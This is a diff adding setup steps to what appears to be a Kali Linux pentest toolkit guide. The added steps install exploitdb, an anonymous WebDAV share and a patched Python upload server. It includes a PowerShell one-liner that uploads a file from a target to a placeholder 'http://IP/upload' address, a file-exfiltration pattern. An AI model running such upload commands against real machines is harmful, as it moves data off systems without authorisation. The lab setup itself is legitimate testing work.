@@ -29,3 +29,35 @@ dotnet tool install --global PowerShell
 ```bash
 sudo apt -y install exploitdb
 ```
+
+## Install WebDAV
+
+```bash
+sudo apt install python3-wsgidav
+mkdir /home/kali/webdav
+echo "WebDAV test" > /home/kali/webdav/test.txt
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+```
+
+## Install Upload server
+
+```bash
+pip install uploadserver
+```
+
+Patch uploadserver.receive_upload(handler)
+
+* Support single or multiple files
+* Support Powershell UploadFile
+* `(New-Object Net.WebClient).UploadFile('http://IP/upload', 'some-file.txt');`
+
+```python
+# gedit /home/kali/.local/lib/python3.11/site-packages/uploadserver/__init__.py
+# patch receive_upload(handler)
+if 'file' in form:
+    fields = form['file']
+elif 'files' in form:
+    fields = form['files']
+else:
+    return (http.HTTPStatus.BAD_REQUEST, 'Field "file" or "files" not found')
+```
